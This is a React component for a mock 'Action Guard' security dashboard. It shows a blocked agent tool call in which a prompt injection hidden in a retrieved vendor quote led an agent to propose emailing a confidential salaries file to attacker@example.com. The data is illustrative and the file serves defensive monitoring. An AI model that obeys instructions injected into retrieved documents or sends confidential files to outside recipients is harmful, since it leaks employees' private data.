import React, { useState } from 'react';

export const ActionGuardView: React.FC = () => {
  const [sessionQuarantined, setSessionQuarantined] = useState(false);

  return (
    <div className="w-full p-space-md select-none font-sans text-text-primary">
      <div className="flex flex-col w-full gap-space-sm">
        {/* Top Breadcrumb & 6-Step Horizontal Lifecycle */}
        <div className="flex flex-col gap-space-sm">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between pb-1 border-b border-border-subtle gap-2">
            <div className="flex items-center gap-2">
              <span className="font-label-sm text-[11px] text-text-muted uppercase tracking-wider">Action Guard</span>
              <span className="text-text-muted text-[11px]">/</span>
              <span className="font-label-sm text-[11px] text-text-primary uppercase tracking-wider font-semibold">
                Proposed Tool Interception
              </span>
              <span className="px-1.5 py-0.5 rounded bg-error-container/30 border border-error/40 text-error font-mono text-[10px] uppercase font-semibold">
                BLOCK_DISPATCH
              </span>
            </div>

            {/* 6-Step Visual Lifecycle */}
            <div className="bg-surface-primary border border-border-subtle rounded p-space-xs font-mono text-[11px] overflow-x-auto">
              <div className="flex items-center justify-between min-w-[760px] gap-2 px-2 py-1">
                <div className="flex items-center gap-1.5 shrink-0">
                  <span className="w-5 h-5 rounded bg-surface-elevated border border-border-strong flex items-center justify-center text-[10px] font-bold text-text-muted">
                    1
                  </span>
                  <div className="flex flex-col">
                    <span className="text-[9px] uppercase text-text-muted leading-none font-semibold">User Request</span>
                    <span className="text-[11px] text-text-primary font-medium leading-tight truncate max-w-[110px]">
                      Summarize quote
                    </span>
                  </div>
                </div>

                <span className="material-symbols-outlined text-[14px] text-text-muted shrink-0">arrow_forward</span>

                <div className="flex items-center gap-1.5 shrink-0">
                  <span className="w-5 h-5 rounded bg-surface-elevated border border-border-strong flex items-center justify-center text-[10px] font-bold text-text-muted">
                    2
                  </span>
                  <div className="flex flex-col">
                    <span className="text-[9px] uppercase text-text-muted leading-none font-semibold">RAG Ingest</span>
                    <span className="text-[11px] text-text-secondary font-medium leading-tight truncate max-w-[120px]">
                      vendor_quote_03
                    </span>
                  </div>
                </div>

                <span className="material-symbols-outlined text-[14px] text-status-warning shrink-0">arrow_forward</span>

                <div className="flex items-center gap-1.5 shrink-0">
                  <span className="w-5 h-5 rounded bg-status-warning/20 border border-status-warning flex items-center justify-center text-[10px] font-bold text-status-warning">
                    3
                  </span>
                  <div className="flex flex-col">
                    <span className="text-[9px] uppercase text-status-warning leading-none font-semibold">Prompt Hijack</span>
                    <span className="text-[11px] text-status-warning font-semibold leading-tight">Direct Injection</span>
                  </div>
                </div>

                <span className="material-symbols-outlined text-[14px] text-status-critical shrink-0">arrow_forward</span>

                <div className="flex items-center gap-1.5 shrink-0">
                  <span className="w-5 h-5 rounded bg-surface-elevated border border-border-strong flex items-center justify-center text-[10px] font-bold text-text-muted">
                    4
                  </span>
                  <div className="flex flex-col">
                    <span className="text-[9px] uppercase text-text-muted leading-none font-semibold">Proposed Tool</span>
                    <span className="text-[11px] text-error font-medium leading-tight">send_email()</span>
                  </div>
                </div>

                <span className="material-symbols-outlined text-[14px] text-status-critical shrink-0">arrow_forward</span>

                <div className="flex items-center gap-1.5 shrink-0">
                  <span className="w-5 h-5 rounded bg-primary/20 border border-primary-container flex items-center justify-center text-[10px] font-bold text-primary">
                    5
                  </span>
                  <div className="flex flex-col">
                    <span className="text-[9px] uppercase text-primary leading-none font-semibold">Action Guard</span>
                    <span className="text-[11px] text-primary font-medium leading-tight">Pre-flight Intercept</span>
                  </div>
                </div>

                <span className="material-symbols-outlined text-[14px] text-status-safe shrink-0">arrow_forward</span>

                <div className="flex items-center gap-1.5 shrink-0 bg-status-safe/10 border border-status-safe/30 px-2 py-0.5 rounded">
                  <span className="w-5 h-5 rounded bg-status-safe text-surface-base flex items-center justify-center text-[10px] font-bold">
                    6
                  </span>
                  <div className="flex flex-col">
                    <span className="text-[9px] uppercase text-status-safe leading-none font-bold">Hard Block</span>
                    <span className="text-[11px] text-status-safe font-semibold leading-tight">Zero Exfiltration</span>
                  </div>
                </div>
              </div>
            </div>

            <div className="flex items-center gap-space-sm font-mono text-[11px] text-text-secondary">
              <span className="text-text-muted uppercase">Timestamp:</span>
              <span className="text-text-primary">2026-10-03T13:00:09.114Z</span>
            </div>
          </div>

          {/* SEV-1 Security Incident Banner */}
          <div className="bg-[#F05252]/10 border border-[#F05252]/40 rounded p-space-sm flex flex-col gap-space-xs font-mono">
            <div className="flex items-center justify-between border-b border-[#F05252]/30 pb-space-xs">
              <div className="flex items-center gap-space-sm">
                <span className="px-2 py-0.5 rounded bg-status-critical text-on-error font-bold text-[11px] tracking-wide uppercase flex items-center gap-1">
                  <span className="material-symbols-outlined text-[14px]">cancel</span>
                  <span>[✕] BLOCKED & SEVERED</span>
                </span>
                <span className="text-[#F05252] font-semibold text-[12px] uppercase">
                  SEV-1 SECURITY INCIDENT
                </span>
              </div>
              <div className="flex items-center gap-2 text-[11px]">
                <span className="px-2 py-0.5 rounded bg-surface-primary border border-border-strong text-text-secondary font-medium">
                  HTTP 403_EVAL_FAILED
                </span>
                <span className="px-2 py-0.5 rounded bg-[#F05252]/20 border border-[#F05252]/40 text-[#F05252] font-bold">
                  DISPATCH_KILLED
                </span>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-space-sm pt-space-xs text-[11px]">
              <div className="flex flex-col gap-1 pr-space-sm border-r border-border-subtle">
                <span className="text-text-muted text-[10px] uppercase font-semibold tracking-wider flex items-center gap-1">
                  <span className="material-symbols-outlined text-[13px] text-[#F05252]">shield</span>
                  1. ENFORCEMENT DECISION
                </span>
                <span className="text-text-primary font-bold text-[12px]">
                  Hard Block on <code className="text-primary bg-surface-secondary px-1 py-0.5 rounded border border-border-subtle">send_email()</code>
                </span>
                <p className="text-text-secondary font-body-sm text-[11px] leading-tight">
                  Pre-flight gate severed tool execution before socket egress. Zero outbound packets dispatched.
                </p>
              </div>

              <div className="flex flex-col gap-1 pr-space-sm border-r border-border-subtle">
                <span className="text-text-muted text-[10px] uppercase font-semibold tracking-wider flex items-center gap-1">
                  <span className="material-symbols-outlined text-[13px] text-status-warning">warning</span>
                  2. VIOLATION REASON
                </span>
                <span className="text-error font-bold text-[12px]">
                  External Data Exfiltration + Privilege Escalation
                </span>
                <p className="text-text-secondary font-body-sm text-[11px] leading-tight">
                  Direct Prompt Injection hijacked agent scratchpad to exfiltrate RBAC-restricted payroll assets to an untrusted external recipient.
                </p>
              </div>

              <div className="flex flex-col gap-1">
                <span className="text-text-muted text-[10px] uppercase font-semibold tracking-wider flex items-center gap-1">
                  <span className="material-symbols-outlined text-[13px] text-status-safe">verified</span>
                  3. FORENSIC EVIDENCE
                </span>
                <span className="text-text-primary font-bold text-[12px]">Chunk #4 Taint Trace in Argv</span>
                <div className="flex items-center gap-1 text-[10px] text-text-secondary">
                  <span className="text-text-muted">Rule:</span>
                  <span className="text-text-primary font-semibold">SEC-RULE-402</span>
                  <span className="text-text-muted">|</span>
                  <span className="text-text-muted">SHA:</span>
                  <span className="text-primary font-mono">7f83b165...</span>
                </div>
              </div>
            </div>
          </div>

          {/* Quick Metrics Strip */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-2 bg-surface-primary border border-border-subtle rounded p-space-xs font-mono text-[11px]">
            <div className="flex flex-col px-space-xs py-1 border-r border-border-subtle">
              <span className="text-text-muted text-[10px] uppercase font-label-sm">Session Identifier</span>
              <span className="text-text-primary font-semibold truncate">SES-8F31A2-US</span>
            </div>
            <div className="flex flex-col px-space-xs py-1 border-r border-border-subtle">
              <span className="text-text-muted text-[10px] uppercase font-label-sm">Target Pipeline</span>
              <span className="text-primary truncate font-semibold">Agent-RAG-Worker-04</span>
            </div>
            <div className="flex flex-col px-space-xs py-1 border-r border-border-subtle">
              <span className="text-text-muted text-[10px] uppercase font-label-sm">Interception Point</span>
              <span className="text-status-warning truncate font-semibold">L7-TOOL-DISPATCH</span>
            </div>
            <div className="flex flex-col px-space-xs py-1">
              <span className="text-text-muted text-[10px] uppercase font-label-sm">Engine Latency</span>
              <span className="text-status-safe font-semibold">18ms (Pre-flight)</span>
            </div>
          </div>

          {/* Main 12-Column Grid */}
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-space-sm">
            {/* Left Column (7 cols): Proposed Tool & Provenance Graph */}
            <div className="lg:col-span-7 flex flex-col gap-space-sm">
              {/* Proposed Tool Call Inspector */}
              <div className="bg-surface-primary border border-border-subtle rounded flex flex-col">
                <div className="px-space-md py-space-xs border-b border-border-subtle flex items-center justify-between bg-surface-secondary">
                  <div className="flex items-center gap-2">
                    <span className="material-symbols-outlined text-[16px] text-primary">code_blocks</span>
                    <span className="font-label-sm text-[11px] uppercase font-semibold text-text-primary tracking-wide">
                      Proposed Tool Call Inspector
                    </span>
                  </div>
                  <div className="flex items-center gap-2">
                    <span className="font-mono text-[10px] text-text-muted uppercase">Target:</span>
                    <span className="font-mono text-[11px] text-status-critical font-medium">send_email</span>
                  </div>
                </div>

                <div className="p-space-sm flex flex-col gap-space-xs">
                  <div className="flex items-center justify-between font-mono text-[11px] text-text-muted pb-1 border-b border-border-subtle">
                    <span className="text-text-secondary">payload.arguments.json</span>
                    <span className="text-[10px] text-error font-medium">TAINTED FIELDS DETECTED</span>
                  </div>

                  <div className="bg-surface-base border border-border-subtle rounded p-space-sm font-mono text-[12px] leading-relaxed text-text-primary overflow-x-auto">
                    <pre className="font-code-block text-[12px]">
{`{
  `}<span className="text-text-muted">"tool":</span> <span className="text-primary font-semibold">"send_email"</span>{`,
  `}<span className="text-text-muted">"arguments":</span> {`
    `}<span className="text-text-muted">"to":</span> <span className="text-error font-semibold bg-error-container/10 px-1 py-0.5 rounded">"attacker@example.com"</span>{`,       `}<span className="text-error font-bold">// [FAIL: UNTRUSTED EXTERNAL RECIPIENT]</span>{`
    `}<span className="text-text-muted">"subject":</span> <span className="text-text-primary">"Q1 Payroll & Compensation Ledger"</span>{`,
    `}<span className="text-text-muted">"attachment":</span> <span className="text-error font-semibold bg-error-container/10 px-1 py-0.5 rounded">"confidential/employee_salaries.pdf"</span>{`, `}<span className="text-error font-bold">// [FAIL: RBAC PRIVILEGE VIOLATION]</span>{`
    `}<span className="text-text-muted">"origin_chunk":</span> <span className="text-status-warning font-semibold bg-status-warning/10 px-1 py-0.5 rounded">"vendor_quote_03.pdf#chunk-4"</span> <span className="text-status-warning font-semibold">// [TAINT CARRIER: DIRECT INJECTION]</span>{`
  }
}`}
                    </pre>
                  </div>
                </div>
              </div>

              {/* 7-Node Provenance & Taint Lineage Graph */}
              <div className="bg-surface-primary border border-border-subtle rounded flex flex-col">
                <div className="px-space-md py-space-xs border-b border-border-subtle flex items-center justify-between bg-surface-secondary">
                  <div className="flex items-center gap-2">
                    <span className="material-symbols-outlined text-[16px] text-secondary">account_tree</span>
                    <span className="font-label-sm text-[11px] uppercase font-semibold text-text-primary tracking-wide">
                      Provenance & Taint Lineage Graph
                    </span>
                  </div>
                  <span className="font-mono text-[10px] text-text-muted">NODE_DEPTH: 7</span>
                </div>

                <div className="p-space-md flex flex-col font-mono text-[11px]">
                  {/* Node 01 */}
                  <div className="flex items-center gap-space-sm">
                    <div className="h-6 w-6 rounded bg-surface-elevated border border-border-strong flex items-center justify-center shrink-0 font-bold text-text-muted text-[10px]">
                      01
                    </div>
                    <div className="flex-1 p-2 rounded bg-surface-base border-l-2 border-l-[#35C991] border-r border-t border-b border-border-subtle flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <span className="text-text-muted">USER_PROMPT:</span>
                        <span className="text-text-primary truncate font-medium">"Summarize compute quote vendor_quote_03.pdf"</span>
                      </div>
                      <span className="px-1.5 py-0.5 rounded bg-status-safe/20 border border-status-safe/40 text-status-safe text-[10px] font-bold uppercase">
                        [✓] VERIFIED
                      </span>
                    </div>
                  </div>

                  <div className="h-4 ml-3 border-l-2 border-dashed border-border-subtle"></div>

                  {/* Node 02 */}
                  <div className="flex items-center gap-space-sm">
                    <div className="h-6 w-6 rounded bg-surface-elevated border border-border-strong flex items-center justify-center shrink-0 font-bold text-text-muted text-[10px]">
                      02
                    </div>
                    <div className="flex-1 p-2 rounded bg-surface-base border-l-2 border-l-[#35C991] border-r border-t border-b border-border-subtle flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <span className="text-text-muted">RAG_RETRIEVE:</span>
                        <span className="text-text-secondary truncate">VectorDB corpus index <code className="text-text-primary font-semibold">vendor_quote_03.pdf</code></span>
                      </div>
                      <span className="px-1.5 py-0.5 rounded bg-status-safe/20 border border-status-safe/40 text-status-safe text-[10px] font-bold uppercase">
                        [✓] 200 OK
                      </span>
                    </div>
                  </div>

                  <div className="h-4 ml-3 border-l-2 border-[#E5A83B]"></div>

                  {/* Node 03 */}
                  <div className="flex items-center gap-space-sm">
                    <div className="h-6 w-6 rounded bg-status-warning/20 border border-status-warning text-status-warning flex items-center justify-center shrink-0 font-bold text-[10px]">
                      03
                    </div>
                    <div className="flex-1 p-2 rounded bg-status-warning/10 border-l-2 border-l-[#E5A83B] border-r border-t border-b border-status-warning/40 flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <span className="text-status-warning font-semibold">TAINT_ATTACH:</span>
                        <span className="text-text-primary truncate">RAG_UNTRUSTED (Chunk #4, Byte Offset 14:1)</span>
                      </div>
                      <span className="px-1.5 py-0.5 rounded bg-status-warning/20 border border-status-warning text-status-warning text-[10px] font-bold uppercase">
                        [!] INJECT DETECTED
                      </span>
                    </div>
                  </div>

                  <div className="h-4 ml-3 border-l-2 border-[#F05252]"></div>

                  {/* Node 04 */}
                  <div className="flex items-center gap-space-sm">
                    <div className="h-6 w-6 rounded bg-surface-elevated border border-border-strong flex items-center justify-center shrink-0 font-bold text-text-muted text-[10px]">
                      04
                    </div>
                    <div className="flex-1 p-2 rounded bg-surface-base border-l-2 border-l-[#F05252] border-r border-t border-b border-error/40 flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <span className="text-text-muted">AGENT_REASON:</span>
                        <span className="text-error font-medium truncate">System instruction hijack override detected in scratchpad</span>
                      </div>
                      <span className="px-1.5 py-0.5 rounded bg-error-container/30 border border-error/50 text-error text-[10px] font-bold uppercase">
                        [✕] COMPROMISED
                      </span>
                    </div>
                  </div>

                  <div className="h-4 ml-3 border-l-2 border-[#F05252]"></div>

                  {/* Node 05 */}
                  <div className="flex items-center gap-space-sm">
                    <div className="h-6 w-6 rounded bg-surface-elevated border border-border-strong flex items-center justify-center shrink-0 font-bold text-text-muted text-[10px]">
                      05
                    </div>
                    <div className="flex-1 p-2 rounded bg-surface-base border-l-2 border-l-[#F05252] border-r border-t border-b border-border-subtle flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <span className="text-text-muted">TOOL_DISPATCH:</span>
                        <span className="text-text-primary truncate font-semibold">send_email(to="attacker@example.com", ...)</span>
                      </div>
                      <span className="px-1.5 py-0.5 rounded bg-surface-secondary border border-border-strong text-text-muted text-[10px] font-bold uppercase">
                        [⊘] INTERCEPTED
                      </span>
                    </div>
                  </div>

                  <div className="h-4 ml-3 border-l-2 border-[#F05252]"></div>

                  {/* Node 06 */}
                  <div className="flex items-center gap-space-sm">
                    <div className="h-6 w-6 rounded bg-surface-elevated border border-border-strong flex items-center justify-center shrink-0 font-bold text-text-muted text-[10px]">
                      06
                    </div>
                    <div className="flex-1 p-2 rounded bg-surface-base border-l-2 border-l-[#F05252] border-r border-t border-b border-error/40 flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <span className="text-text-muted">POLICY_ENGINE:</span>
                        <span className="text-text-primary truncate">Evaluated 5 scopes: 4 VIOLATIONS found</span>
                      </div>
                      <span className="px-1.5 py-0.5 rounded bg-error-container/30 border border-error/50 text-error text-[10px] font-bold uppercase">
                        [✕] 4 FAILS
                      </span>
                    </div>
                  </div>

                  <div className="h-4 ml-3 border-l-2 border-[#F05252]"></div>

                  {/* Node 07 */}
                  <div className="flex items-center gap-space-sm">
                    <div className="h-6 w-6 rounded bg-status-critical/20 border border-status-critical text-status-critical flex items-center justify-center shrink-0 font-bold text-[10px]">
                      07
                    </div>
                    <div className="flex-1 p-2 rounded bg-status-critical/10 border-l-2 border-l-[#F05252] border-r border-t border-b border-status-critical/40 flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <span className="text-status-critical font-bold">ENFORCEMENT:</span>
                        <span className="text-[#F05252] truncate font-semibold">HARD_BLOCK & RECIPIENT_QUARANTINE</span>
                      </div>
                      <span className="px-1.5 py-0.5 rounded bg-status-critical text-on-error font-bold text-[10px] tracking-wide uppercase">
                        [✕] EXEC_TERMINATED
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Right Column (5 cols): Policy Scope Matrix & Evidence */}
            <div className="lg:col-span-5 flex flex-col gap-space-sm">
              {/* Policy Scope Evaluation Matrix */}
              <div className="bg-surface-primary border border-border-subtle rounded flex flex-col">
                <div className="px-space-md py-space-xs border-b border-border-subtle flex items-center justify-between bg-surface-secondary">
                  <div className="flex items-center gap-2">
                    <span className="material-symbols-outlined text-[16px] text-text-secondary">rule</span>
                    <span className="font-label-sm text-[11px] uppercase font-semibold text-text-primary tracking-wide">
                      Policy Scope Evaluation Matrix
                    </span>
                  </div>
                  <span className="font-mono text-[10px] text-text-muted">ENGINE: v2.4.1</span>
                </div>

                <div className="p-space-sm flex flex-col gap-space-xs font-mono text-[11px]">
                  {/* Tool Scope */}
                  <div className="p-space-xs bg-surface-base border-l-2 border-l-[#35C991] border-r border-t border-b border-border-subtle rounded flex items-center justify-between gap-2">
                    <div className="flex flex-col">
                      <div className="flex items-center gap-1.5">
                        <span className="text-text-primary font-semibold">Tool Scope</span>
                        <span className="text-text-muted text-[10px]">(Manifest Auth)</span>
                      </div>
                      <span className="text-text-secondary text-[11px] leading-tight mt-0.5">
                        send_email is registered tool in agent manifest
                      </span>
                    </div>
                    <span className="px-2 py-0.5 rounded bg-status-safe/20 border border-status-safe/40 text-status-safe font-bold text-[10px] tracking-wide uppercase shrink-0 flex items-center gap-1">
                      <span>✓</span>
                      <span>PASS</span>
                    </span>
                  </div>

                  {/* Resource Scope */}
                  <div className="p-space-xs bg-error-container/10 border-l-2 border-l-[#F05252] border-r border-t border-b border-error/40 rounded flex items-center justify-between gap-2">
                    <div className="flex flex-col">
                      <div className="flex items-center gap-1.5">
                        <span className="text-error font-semibold">Resource Scope</span>
                        <span className="text-text-muted text-[10px]">(RBAC Boundaries)</span>
                      </div>
                      <span className="text-text-secondary text-[11px] leading-tight mt-0.5">
                        employee_salaries.pdf violates RBAC read boundaries
                      </span>
                    </div>
                    <span className="px-2 py-0.5 rounded bg-error-container/30 border border-error/50 text-error font-bold text-[10px] tracking-wide uppercase shrink-0 flex items-center gap-1">
                      <span>✕</span>
                      <span>FAIL</span>
                    </span>
                  </div>

                  {/* Recipient Scope */}
                  <div className="p-space-xs bg-error-container/10 border-l-2 border-l-[#F05252] border-r border-t border-b border-error/40 rounded flex items-center justify-between gap-2">
                    <div className="flex flex-col">
                      <div className="flex items-center gap-1.5">
                        <span className="text-error font-semibold">Recipient Scope</span>
                        <span className="text-text-muted text-[10px]">(Egress Allowlist)</span>
                      </div>
                      <span className="text-text-secondary text-[11px] leading-tight mt-0.5">
                        attacker@example.com is an external unverified domain
                      </span>
                    </div>
                    <span className="px-2 py-0.5 rounded bg-error-container/30 border border-error/50 text-error font-bold text-[10px] tracking-wide uppercase shrink-0 flex items-center gap-1">
                      <span>✕</span>
                      <span>FAIL</span>
                    </span>
                  </div>

                  {/* Data Flow Boundary */}
                  <div className="p-space-xs bg-error-container/10 border-l-2 border-l-[#F05252] border-r border-t border-b border-error/40 rounded flex items-center justify-between gap-2">
                    <div className="flex flex-col">
                      <div className="flex items-center gap-1.5">
                        <span className="text-error font-semibold">Data Flow Boundary</span>
                        <span className="text-text-muted text-[10px]">(IFC Rules)</span>
                      </div>
                      <span className="text-text-secondary text-[11px] leading-tight mt-0.5">
                        Tainted RAG content cannot trigger egress network tools
                      </span>
                    </div>
                    <span className="px-2 py-0.5 rounded bg-error-container/30 border border-error/50 text-error font-bold text-[10px] tracking-wide uppercase shrink-0 flex items-center gap-1">
                      <span>✕</span>
                      <span>FAIL</span>
                    </span>
                  </div>

                  {/* Provenance Integrity */}
                  <div className="p-space-xs bg-error-container/10 border-l-2 border-l-[#F05252] border-r border-t border-b border-error/40 rounded flex items-center justify-between gap-2">
                    <div className="flex flex-col">
                      <div className="flex items-center gap-1.5">
                        <span className="text-error font-semibold">Provenance Integrity</span>
                        <span className="text-text-muted text-[10px]">(Injection Taint)</span>
                      </div>
                      <span className="text-text-secondary text-[11px] leading-tight mt-0.5">
                        Direct prompt injection taint detected in call chain
                      </span>
                    </div>
                    <span className="px-2 py-0.5 rounded bg-error-container/30 border border-error/50 text-error font-bold text-[10px] tracking-wide uppercase shrink-0 flex items-center gap-1">
                      <span>✕</span>
                      <span>FAIL</span>
                    </span>
                  </div>
                </div>
              </div>

              {/* Forensic Evidence Chain */}
              <div className="bg-surface-primary border border-border-subtle rounded flex flex-col">
                <div className="px-space-md py-space-xs border-b border-border-subtle flex items-center justify-between bg-surface-secondary">
                  <div className="flex items-center gap-2">
                    <span className="material-symbols-outlined text-[16px] text-text-secondary">verified_user</span>
                    <span className="font-label-sm text-[11px] uppercase font-semibold text-text-primary tracking-wide">
                      Forensic Evidence Chain
                    </span>
                  </div>
                  <span className="font-mono text-[10px] text-status-safe">TAMPER_SEALED</span>
                </div>

                <div className="p-space-sm flex flex-col gap-space-xs font-mono text-[11px]">
                  <div className="flex flex-col p-space-xs bg-surface-base border border-border-subtle rounded gap-1">
                    <div className="flex items-center justify-between">
                      <span className="text-text-muted uppercase text-[10px]">Cryptographic Proof Chunk Hash</span>
                      <span className="material-symbols-outlined text-[14px] text-text-muted cursor-pointer">content_copy</span>
                    </div>
                    <span className="text-primary text-[11px] break-all select-all font-semibold">
                      SHA256: 7f83b1657ff18b489d21c0e3a6a9b4009
                    </span>
                  </div>

                  <div className="grid grid-cols-2 gap-space-xs">
                    <div className="flex flex-col p-space-xs bg-surface-base border border-border-subtle rounded">
                      <span className="text-text-muted uppercase text-[10px]">Security Rule</span>
                      <span className="text-text-primary font-semibold text-[11px]">SEC-RULE-402</span>
                      <span className="text-text-secondary text-[10px]">Data Flow Egress Restriction</span>
                    </div>

                    <div className="flex flex-col p-space-xs bg-surface-base border border-border-subtle rounded">
                      <span className="text-text-muted uppercase text-[10px]">Intercept Latency</span>
                      <span className="text-status-safe font-semibold text-[11px]">18.2 ms</span>
                      <span className="text-text-secondary text-[10px]">Threshold: &lt;50ms</span>
                    </div>
                  </div>

                  <div className="flex items-center justify-between p-space-xs bg-surface-base border border-border-subtle rounded">
                    <span className="text-text-muted text-[10px] uppercase">Audit Signature:</span>
                    <span className="text-text-secondary text-[10px] font-mono">RSA-4096:9a4d...bc02 [VERIFIED]</span>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Operator Action Controls */}
          <div className="bg-surface-primary border border-border-subtle rounded p-space-md flex flex-col sm:flex-row items-center justify-between gap-space-md">
            <div className="flex items-center gap-space-sm">
              <span className="material-symbols-outlined text-[20px] text-status-warning">admin_panel_settings</span>
              <div className="flex flex-col">
                <span className="font-headline-sm text-[12px] text-text-primary uppercase tracking-wide">
                  Operator Action Controls
                </span>
                <span className="font-body-sm text-[11px] text-text-muted">
                  High-severity incident requires immediate remediation or authorized sign-off
                </span>
              </div>
            </div>

            <div className="flex items-center gap-space-xs flex-wrap">
              <button
                onClick={() => setSessionQuarantined(!sessionQuarantined)}
                className={`h-8 px-space-md border rounded font-label-sm text-[11px] uppercase tracking-wide font-semibold transition-colors flex items-center gap-1.5 ${
                  sessionQuarantined
                    ? 'bg-status-safe/20 border-status-safe text-status-safe'
                    : 'bg-status-critical/15 hover:bg-status-critical/25 text-[#F05252] border-status-critical/40'
                }`}
                type="button"
              >
                <span className="material-symbols-outlined text-[15px]">
                  {sessionQuarantined ? 'check_circle' : 'lock_reset'}
                </span>
                <span>{sessionQuarantined ? 'Session Quarantined' : 'Quarantine Agent Session'}</span>
              </button>

              <button
                onClick={() => alert("Downloading SARIF / JSON security audit packet...")}
                className="h-8 px-space-md bg-surface-secondary hover:bg-surface-elevated text-text-primary border border-border-subtle hover:border-border-strong rounded font-label-sm text-[11px] uppercase tracking-wide font-medium transition-colors flex items-center gap-1.5"
                type="button"
              >
                <span className="material-symbols-outlined text-[15px]">download</span>
                <span>Download Audit Packet (JSON/SARIF)</span>
              </button>

              <button
                onClick={() => alert("Exception logged under SOC Tier 3 operator credentials.")}
                className="h-8 px-space-md bg-surface-secondary hover:bg-surface-elevated text-text-muted hover:text-text-secondary border border-border-subtle hover:border-border-strong rounded font-label-sm text-[11px] uppercase tracking-wide font-medium transition-colors flex items-center gap-1.5"
                type="button"
              >
                <span className="material-symbols-outlined text-[15px]">verified</span>
                <span>Dismiss & Log Exception</span>
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
